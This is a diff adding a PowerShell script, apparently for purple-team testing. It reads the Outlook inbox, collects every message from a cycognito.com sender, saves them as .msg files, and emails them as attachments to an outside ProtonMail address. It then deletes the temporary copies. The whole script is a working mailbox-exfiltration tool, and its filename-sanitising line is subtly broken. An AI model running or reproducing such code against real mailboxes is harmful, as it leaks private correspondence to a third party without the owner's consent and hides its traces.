@@ -1,0 +1,51 @@
+# Set the recipient email address
+$toAddress = "purpleteaming@protonmail.com"
+$subject = "Collected Emails from cycognito.com"
+$body = "Attached are the emails received from cycognito.com."
+
+# Get an instance of the Outlook application
+$outlook = New-Object -ComObject Outlook.Application
+$namespace = $outlook.GetNamespace("MAPI")
+
+# Get the Inbox folder
+$inbox = $namespace.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderInbox)
+
+# Collect emails from cycognito.com domain
+$filter = "@cycognito.com"
+$emailItems = @()
+foreach ($email in $inbox.Items) {
+    if ($email.SenderEmailAddress -like "*$filter") {
+        $emailItems += $email
+    }
+}
+
+# Save emails as MSG files
+$tempFolder = [System.IO.Path]::GetTempPath()
+$emailFiles = @()
+foreach ($email in $emailItems) {
+    $fileName = [System.IO.Path]::GetInvalidFileNameChars() -replace $email.Subject, "_"
+    $filePath = Join-Path -Path $tempFolder -ChildPath "$fileName.msg"
+    $email.SaveAs($filePath, [Microsoft.Office.Interop.Outlook.OlSaveAsType]::olMSG)
+    $emailFiles += $filePath
+}
+
+# Create a new email to send the collected emails
+$mail = $outlook.CreateItem([Microsoft.Office.Interop.Outlook.OlItemType]::olMailItem)
+$mail.To = $toAddress
+$mail.Subject = $subject
+$mail.Body = $body
+
+# Attach the collected emails to the new email
+foreach ($file in $emailFiles) {
+    $mail.Attachments.Add($file)
+}
+
+# Send the email
+$mail.Send()
+
+# Clean up temporary files
+foreach ($file in $emailFiles) {
+    Remove-Item $file
+}
+
+Write-Output "Emails from cycognito.com have been sent to $toAddress."
